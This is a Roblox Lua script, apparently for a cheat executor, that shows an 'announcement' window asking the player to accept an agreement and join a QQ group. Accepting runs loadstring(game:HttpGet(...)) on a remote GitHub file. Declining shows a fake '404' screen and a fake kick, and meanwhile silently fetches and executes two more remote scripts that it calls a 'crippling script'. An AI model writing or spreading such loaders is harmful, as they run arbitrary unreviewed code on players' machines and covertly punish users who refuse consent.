-- Sunkun公告UI脚本
-- 作者：Sunkun
-- 不加密没关系😏因为这不重要

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")

-- 创建主UI
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "SunkunAnnouncement"
ScreenGui.ResetOnSpawn = false
ScreenGui.Parent = PlayerGui

-- 主容器
local MainFrame = Instance.new("Frame")
MainFrame.Name = "MainFrame"
MainFrame.Size = UDim2.new(0, 400, 0, 290)
MainFrame.Position = UDim2.new(0.5, -90, 0.5, -40)
MainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
MainFrame.BackgroundColor3 = Color3.new(0, 0, 0)
MainFrame.BackgroundTransparency = 0.1
MainFrame.BorderSizePixel = 0
MainFrame.ClipsDescendants = true
MainFrame.Parent = ScreenGui

-- 边缘发光效果
local EdgeGlow = Instance.new("UIStroke")
EdgeGlow.Name = "EdgeGlow"
EdgeGlow.Parent = MainFrame
EdgeGlow.Color = Color3.new(1, 0, 0)
EdgeGlow.Thickness = 3
EdgeGlow.Transparency = 0.3

-- 毛边效果粒子
local FurEffect = Instance.new("Frame")
FurEffect.Name = "FurEffect"
FurEffect.Size = UDim2.new(1, 10, 1, 10)
FurEffect.Position = UDim2.new(0, -5, 0, -5)
FurEffect.BackgroundTransparency = 1
FurEffect.Parent = MainFrame

-- 创建毛边粒子
for i = 1, 40 do
    local fur = Instance.new("Frame")
    fur.Name = "Fur"..i
    fur.Size = UDim2.new(0, math.random(2, 4), 0, math.random(2, 4))
    fur.Position = UDim2.new(0, math.random(-5, 385), 0, math.random(-5, 485))
    fur.BackgroundColor3 = Color3.new(math.random(), math.random(), math.random())
    fur.BorderSizePixel = 0
    fur.Parent = FurEffect
end

-- 标题栏
local TitleBar = Instance.new("Frame")
TitleBar.Name = "TitleBar"
TitleBar.Size = UDim2.new(1, 0, 0, 30)
TitleBar.BackgroundColor3 = Color3.new(0.1, 0.1, 0.1)
TitleBar.BorderSizePixel = 0
TitleBar.Parent = MainFrame

-- 标题文本
local TitleText = Instance.new("TextLabel")
TitleText.Name = "TitleText"
TitleText.Size = UDim2.new(1, -40, 1, 0)
TitleText.Position = UDim2.new(0, 10, 0, 0)
TitleText.BackgroundTransparency = 1
TitleText.Text = "Sunkun公告"
TitleText.TextColor3 = Color3.new(1, 1, 1)
TitleText.TextSize = 18
TitleText.Font = Enum.Font.GothamBold
TitleText.TextXAlignment = Enum.TextXAlignment.Left
TitleText.Parent = TitleBar

-- 关闭按钮
local CloseButton = Instance.new("TextButton")
CloseButton.Name = "CloseButton"
CloseButton.Size = UDim2.new(0, 30, 0, 30)
CloseButton.Position = UDim2.new(1, -30, 0, 0)
CloseButton.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
CloseButton.Text = "X"
CloseButton.TextColor3 = Color3.new(1, 1, 1)
CloseButton.TextSize = 18
CloseButton.Font = Enum.Font.GothamBold
CloseButton.Parent = TitleBar

-- 内容滚动框
local ScrollFrame = Instance.new("ScrollingFrame")
ScrollFrame.Name = "ScrollFrame"
ScrollFrame.Size = UDim2.new(1, -20, 1, -150)
ScrollFrame.Position = UDim2.new(0, 10, 0, 40)
ScrollFrame.BackgroundTransparency = 1
ScrollFrame.BorderSizePixel = 0
ScrollFrame.ScrollBarThickness = 6
ScrollFrame.ScrollingEnabled = true
ScrollFrame.ScrollBarImageColor3 = Color3.new(0.5, 0.5, 0.5)
ScrollFrame.VerticalScrollBarPosition = Enum.VerticalScrollBarPosition.Right
ScrollFrame.Parent = MainFrame

-- 内容容器
local Content = Instance.new("TextLabel")
Content.Name = "Content"
Content.Size = UDim2.new(1, 0, 0, 0)
Content.BackgroundTransparency = 1
Content.Text = "1. 2025-12-20 新出炉的脚本\n\n2. 加入我们QQ群: 927072454\n\n欢迎使用Sunkun脚本！\n\n使用前请仔细阅读说明。\n\n本脚本仅供娱乐使用。\n\n请遵守游戏规则。\n\n更多内容:无 \n\n"
Content.TextColor3 = Color3.new(1, 1, 1)
Content.TextSize = 15
Content.Font = Enum.Font.Gotham
Content.TextXAlignment = Enum.TextXAlignment.Left
Content.TextYAlignment = Enum.TextYAlignment.Top
Content.TextWrapped = true
Content.AutomaticSize = Enum.AutomaticSize.Y
Content.Parent = ScrollFrame

-- 同意签署区域
local AgreeSection = Instance.new("Frame")
AgreeSection.Name = "AgreeSection"
AgreeSection.Size = UDim2.new(1, -20, 0, 40)
AgreeSection.Position = UDim2.new(0, 10, 1, -100)
AgreeSection.BackgroundTransparency = 1
AgreeSection.Parent = MainFrame

-- 同意复选框
local CheckBox = Instance.new("TextButton")
CheckBox.Name = "CheckBox"
CheckBox.Size = UDim2.new(0, 30, 0, 30)
CheckBox.Position = UDim2.new(0, 0, 0, 5)
CheckBox.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
CheckBox.Text = " "
CheckBox.TextColor3 = Color3.new(1, 1, 1)
CheckBox.TextSize = 20
CheckBox.Font = Enum.Font.GothamBold
CheckBox.Parent = AgreeSection

-- 同意文本
local CheckText = Instance.new("TextLabel")
CheckText.Name = "CheckText"
CheckText.Size = UDim2.new(0, 150, 1, 0)
CheckText.Position = UDim2.new(0, 40, 0, 0)
CheckText.BackgroundTransparency = 1
CheckText.Text = "我已明白同意签署"
CheckText.TextColor3 = Color3.new(1, 1, 1)
CheckText.TextSize = 14
CheckText.Font = Enum.Font.Gotham
CheckText.TextXAlignment = Enum.TextXAlignment.Left
CheckText.Parent = AgreeSection

-- 进入脚本按钮
local EnterButton = Instance.new("TextButton")
EnterButton.Name = "EnterButton"
EnterButton.Size = UDim2.new(0, 120, 0, 35)
EnterButton.Position = UDim2.new(1, -120, 0, 3)
EnterButton.BackgroundColor3 = Color3.new(0.2, 0.2, 0.5)
EnterButton.Text = "进入脚本"
EnterButton.TextColor3 = Color3.new(1, 1, 1)
EnterButton.TextSize = 14
EnterButton.Font = Enum.Font.GothamBold
EnterButton.Parent = AgreeSection

-- 不同意按钮
local DisagreeButton = Instance.new("TextButton")
DisagreeButton.Name = "DisagreeButton"
DisagreeButton.Size = UDim2.new(0, 170, 0, 35)
DisagreeButton.Position = UDim2.new(0, 10, 1, -150)
DisagreeButton.BackgroundColor3 = Color3.new(0.5, 0.2, 0.2)
DisagreeButton.Text = "我不同意签署进入"
DisagreeButton.TextColor3 = Color3.new(1, 1, 1)
DisagreeButton.TextSize = 13
DisagreeButton.Font = Enum.Font.Gotham
DisagreeButton.TextWrapped = true
DisagreeButton.Parent = MainFrame

-- 复制QQ群按钮
local CopyButton = Instance.new("TextButton")
CopyButton.Name = "CopyButton"
CopyButton.Size = UDim2.new(0, 170, 0, 30)
CopyButton.Position = UDim2.new(0, 10, 1, -60)
CopyButton.BackgroundColor3 = Color3.new(0.3, 0.3, 0.3)
CopyButton.Text = "点我复制脚本群"
CopyButton.TextColor3 = Color3.new(1, 1, 1)
CopyButton.TextSize = 13
CopyButton.Font = Enum.Font.Gotham
CopyButton.TextWrapped = true
CopyButton.Parent = MainFrame

-- 更新滚动框大小
local function updateScrollSize()
    task.wait(0.1)
    ScrollFrame.CanvasSize = UDim2.new(0, 0, 0, Content.TextBounds.Y + 20)
end

-- 变量
local isChecked = false

-- 边缘闪烁动画
local glowColors = {
    Color3.new(1, 0, 0),    -- 红
    Color3.new(0, 1, 0),    -- 绿
    Color3.new(0, 0, 1),    -- 蓝
    Color3.new(1, 1, 0),    -- 黄
    Color3.new(1, 0, 1)     -- 紫
}

local glowIndex = 1
local glowTween

-- 毛边粒子动画
local function updateFurEffect()
    for _, fur in ipairs(FurEffect:GetChildren()) do
        if fur:IsA("Frame") then
            local currentPos = fur.Position
            fur.Position = UDim2.new(
                currentPos.X.Scale,
                currentPos.X.Offset + math.random(-1, 1),
                currentPos.Y.Scale,
                currentPos.Y.Offset + math.random(-1, 1)
            )
            
            if math.random(1, 20) == 1 then
                fur.BackgroundColor3 = Color3.new(math.random(), math.random(), math.random())
            end
        end
    end
end

-- 边缘闪烁函数
local function startGlowAnimation()
    if glowTween then
        glowTween:Cancel()
    end
    
    glowIndex = glowIndex + 1
    if glowIndex > #glowColors then
        glowIndex = 1
    end
    
    glowTween = TweenService:Create(
        EdgeGlow,
        TweenInfo.new(0.5, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut),
        {Color = glowColors[glowIndex]}
    )
    glowTween:Play()
    
    glowTween.Completed:Connect(function()
        if MainFrame.Parent then
            task.wait(0.1)
            startGlowAnimation()
        end
    end)
end

-- 拖动功能
local function setupDragging()
    local isDragging = false
    local dragStart, startPos
    
    -- 标题栏拖动
    TitleBar.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            isDragging = true
            dragStart = input.Position
            startPos = MainFrame.Position
            
            local connection
            connection = input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    isDragging = false
                    if connection then
                        connection:Disconnect()
                    end
                end
            end)
        end
    end)
    
    -- 处理鼠标移动
    UserInputService.InputChanged:Connect(function(input)
        if isDragging and input.UserInputType == Enum.UserInputType.MouseMovement then
            local currentPos = input.Position
            local delta = currentPos - dragStart
            MainFrame.Position = UDim2.new(
                startPos.X.Scale,
                startPos.X.Offset + delta.X,
                startPos.Y.Scale,
                startPos.Y.Offset + delta.Y
            )
        end
    end)
    
    -- 处理鼠标释放
    UserInputService.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            isDragging = false
        end
    end)
end

-- 初始化滚动框大小
updateScrollSize()

-- 设置拖动功能
setupDragging()

-- 关闭按钮功能
CloseButton.MouseButton1Click:Connect(function()
    ScreenGui:Destroy()
end)

-- 复选框功能
CheckBox.MouseButton1Click:Connect(function()
    isChecked = not isChecked
    if isChecked then
        CheckBox.Text = "✓"
        CheckBox.BackgroundColor3 = Color3.new(0.2, 0.5, 0.2)
        EnterButton.BackgroundColor3 = Color3.new(0.2, 0.5, 0.2)
    else
        CheckBox.Text = " "
        CheckBox.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
        EnterButton.BackgroundColor3 = Color3.new(0.2, 0.2, 0.5)
    end
end)

-- 进入脚本按钮功能 - 关闭原UI
EnterButton.MouseButton1Click:Connect(function()
    if not isChecked then
        local originalText = EnterButton.Text
        EnterButton.Text = "请先同意协议"
        EnterButton.BackgroundColor3 = Color3.new(0.5, 0.2, 0.2)
        
        local originalPos = EnterButton.Position
        for i = 1, 5 do
            EnterButton.Position = UDim2.new(
                originalPos.X.Scale,
                originalPos.X.Offset + math.random(-2, 2),
                originalPos.Y.Scale,
                originalPos.Y.Offset + math.random(-1, 1)
            )
            task.wait(0.05)
        end
        EnterButton.Position = originalPos
        
        task.wait(1)
        EnterButton.Text = originalText
        if isChecked then
            EnterButton.BackgroundColor3 = Color3.new(0.2, 0.5, 0.2)
        else
            EnterButton.BackgroundColor3 = Color3.new(0.2, 0.2, 0.5)
        end
        return
    end
    
    EnterButton.Text = "启动中..."
    EnterButton.BackgroundColor3 = Color3.new(0.2, 0.6, 0.2)
    
    print("Sunkun脚本已启动！")
    
    -- 显示启动消息
    local message = Instance.new("TextLabel")
    message.Name = "WelcomeMessage"
    message.Size = UDim2.new(0, 280, 0, 90)
    message.Position = UDim2.new(0.5, -140, 0.5, -45)
    message.BackgroundColor3 = Color3.new(0.1, 0.1, 0.3)
    message.BorderSizePixel = 2
    message.BorderColor3 = Color3.new(1, 1, 0)
    message.Text = "你好！\n欢迎使用Sunkun脚本！\n脚本已成功启动。"
    message.TextColor3 = Color3.new(1, 1, 1)
    message.TextSize = 18
    message.Font = Enum.Font.GothamBold
    message.TextWrapped = true
    message.ZIndex = 10
    message.Parent = ScreenGui
    
    task.wait(2)
    
    -- 关闭原UI
    ScreenGui:Destroy()
    
    print("Sunkun脚本正在运行...")
    
            loadstring(game:HttpGet("https://raw.githubusercontent.com/dkdkdidoskw/Sunkunz/main/Sunkunkey1.lua"))()
    
    -- 创建脚本UI
    task.wait(0.5)
    createSunkunScript()
end)

-- 不同意按钮功能 - 显示踢出消息并运行脚本代码
DisagreeButton.MouseButton1Click:Connect(function()
    UserInputService.MouseIconEnabled = false
    
    -- 全屏红色覆盖
    local redScreen = Instance.new("Frame")
    redScreen.Name = "RedScreen"
    redScreen.Size = UDim2.new(1, 0, 1, 0)
    redScreen.BackgroundColor3 = Color3.new(1, 0, 0)
    redScreen.BackgroundTransparency = 0.5
    redScreen.ZIndex = 100
    redScreen.Parent = ScreenGui
    
    -- 404错误文本
    local errorText = Instance.new("TextLabel")
    errorText.Name = "ErrorText"
    errorText.Size = UDim2.new(1, 0, 0.5, 0)
    errorText.Position = UDim2.new(0, 0, 0.25, 0)
    errorText.BackgroundTransparency = 1
    errorText.Text = "404"
    errorText.TextColor3 = Color3.new(1, 1, 1)
    errorText.TextSize = 80
    errorText.Font = Enum.Font.GothamBold
    errorText.ZIndex = 101
    errorText.Parent = redScreen
    
    local errorSubText = Instance.new("TextLabel")
    errorSubText.Name = "ErrorSubText"
    errorSubText.Size = UDim2.new(1, 0, 0, 40)
    errorSubText.Position = UDim2.new(0, 0, 0.5, 50)
    errorSubText.BackgroundTransparency = 1
    errorSubText.Text = "ACCESS DENIED"
    errorSubText.TextColor3 = Color3.new(1, 1, 1)
    errorSubText.TextSize = 24
    errorSubText.Font = Enum.Font.Gotham
    errorSubText.ZIndex = 101
    errorSubText.Parent = redScreen
    
    -- 震动效果
    local originalPos = MainFrame.Position
    for i = 1, 15 do
        MainFrame.Position = UDim2.new(
            originalPos.X.Scale,
            originalPos.X.Offset + math.random(-8, 8),
            originalPos.Y.Scale,
            originalPos.Y.Offset + math.random(-8, 8)
        )
        task.wait(0.05)
    end
    
    task.wait(2)
    
    -- 显示踢出消息
    local kickMessage = Instance.new("TextLabel")
    kickMessage.Name = "KickMessage"
    kickMessage.Size = UDim2.new(0, 350, 0, 130)
    kickMessage.Position = UDim2.new(0.5, -175, 0.5, -65)
    kickMessage.BackgroundColor3 = Color3.new(0.2, 0, 0)
    kickMessage.BorderSizePixel = 3
    kickMessage.BorderColor3 = Color3.new(1, 0, 0)
    kickMessage.Text = "为什么不同意\n(等会下面有神秘的)😡🤬\n(纯娱乐😂)\n404:😔"
    kickMessage.TextColor3 = Color3.new(1, 1, 1)
    kickMessage.TextSize = 20
    kickMessage.Font = Enum.Font.GothamBold
    kickMessage.TextWrapped = true
    kickMessage.ZIndex = 102
    kickMessage.Parent = ScreenGui
    
    -- 恢复鼠标
    UserInputService.MouseIconEnabled = true
    
    -- 等待后踢出玩家（模拟）
    task.wait(3)
    
    -- 运行你的脚本代码 - 这里是你添加自定义代码的地方
    print("============== 运行脚本代码开始 ==============")
   loadstring(game:HttpGet("https://raw.githubusercontent.com/dkdkdidoskw/Sunkunz/main/1.lua"))()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/dkdkdidoskw/Sunkunz/main/2.lua"))()
    -- 运行脚本代码("代码内容(我自己写)")
    -- 示例代码（你可以替换成你自己的）：
    print("执行残废脚本...")
    -- 你可以在这里添加你的自定义代码，例如：
    -- 1. 创建破坏性UI
    -- 2. 播放音效
    -- 3. 其他特效
    print("============== 运行脚本代码结束 ==============")
    
    -- 模拟踢出效果
    local kickGui = Instance.new("ScreenGui")
    kickGui.Name = "KickScreen"
    kickGui.ResetOnSpawn = false
    kickGui.Parent = PlayerGui
    
    local kickFrame = Instance.new("Frame")
    kickFrame.Name = "KickFrame"
    kickFrame.Size = UDim2.new(1, 0, 1, 0)
    kickFrame.BackgroundColor3 = Color3.new(0, 0, 0)
    kickFrame.BorderSizePixel = 0
    kickFrame.Parent = kickGui
    
    local kickText = Instance.new("TextLabel")
    kickText.Name = "KickText"
    kickText.Size = UDim2.new(1, 0, 0, 100)
    kickText.Position = UDim2.new(0, 0, 0.5, -50)
    kickText.BackgroundTransparency = 1
    kickText.Text = "制裁开始\n原因：不同意签署协议\n(假😂)"
    kickText.TextColor3 = Color3.new(1, 0, 0)
    kickText.TextSize = 24
    kickText.Font = Enum.Font.GothamBold
    kickText.TextWrapped = true
    kickText.Parent = kickFrame
    
    -- 清理原UI
    ScreenGui:Destroy()
    
    -- 5秒后清理踢出UI
    task.wait(5)
    kickGui:Destroy()
end)

-- 复制QQ群按钮功能
CopyButton.MouseButton1Click:Connect(function()
    local success, errorMsg = pcall(function()
        setclipboard("927072454")
    end)
    
    if success then
        local originalText = CopyButton.Text
        local originalColor = CopyButton.BackgroundColor3
        CopyButton.Text = "✓ 已复制！"
        CopyButton.BackgroundColor3 = Color3.new(0.2, 0.5, 0.2)
        
        local tween = TweenService:Create(
            CopyButton,
            TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.Out),
            {Size = UDim2.new(0, 180, 0, 32)}
        )
        tween:Play()
        
        task.wait(0.3)
        
        local tween2 = TweenService:Create(
            CopyButton,
            TweenInfo.new(0.2, Enum.EasingStyle.Back, Enum.EasingDirection.In),
            {Size = UDim2.new(0, 170, 0, 30)}
        )
        tween2:Play()
        
        task.wait(1)
        
        CopyButton.Text = originalText
        CopyButton.BackgroundColor3 = originalColor
    else
        CopyButton.Text = "复制失败！"
        CopyButton.BackgroundColor3 = Color3.new(0.5, 0.2, 0.2)
        
        task.wait(1)
        
        CopyButton.Text = "点我复制Sunkun脚本官方群"
        CopyButton.BackgroundColor3 = Color3.new(0.3, 0.3, 0.3)
    end
end)

-- 动画循环
local furEffectConnection = RunService.Heartbeat:Connect(function(deltaTime)
    updateFurEffect()
end)

-- 启动边缘闪烁动画
startGlowAnimation()

-- 清理连接
ScreenGui.Destroying:Connect(function()
    if furEffectConnection then
        furEffectConnection:Disconnect()
    end
    if glowTween then
        glowTween:Cancel()
    end
end)

-- 初始化
CheckBox.Text = " "
isChecked = false

print("Sunkun公告UI已加载！")
print("更新内容:1.无")
print("QQ群号🐧：927072454")
print("提示：加入我们获取密钥")
print("提示：内容区域可以上下滚动")